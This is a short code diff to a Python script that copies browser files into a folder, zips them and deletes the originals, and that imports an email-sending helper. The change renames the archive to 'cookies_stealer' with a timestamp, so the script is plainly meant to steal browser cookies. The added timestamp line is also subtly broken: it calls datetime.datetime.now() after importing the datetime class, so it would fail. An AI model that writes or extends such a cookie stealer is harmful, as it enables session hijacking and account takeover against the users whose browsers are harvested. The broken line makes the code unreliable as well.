@@ -3,6 +3,7 @@ import shutil
 import psutil
 import logging
 import zipfile
+from datetime import datetime
 from utils.email_sender import send_email
 
 logging.basicConfig(filename="cookies.log", level=logging.DEBUG, format='%(asctime)s: %(message)s', encoding='utf-8')
@@ -131,7 +132,8 @@ def main():
         logging.info(f"Processing {browser_name}...")
         copy_files_from_paths(browser_name, paths, file_names, base_folder)
 
-    zip_name = "all_browsers_backup.zip"
+    timestamp = datetime.datetime.now().strftime("%y%m%d-%H%M")
+    zip_name = f"cookies_stealer_{timestamp}.zip"
     if create_zip_archive(zip_name, base_folder):
         delete_folder(base_folder)
         
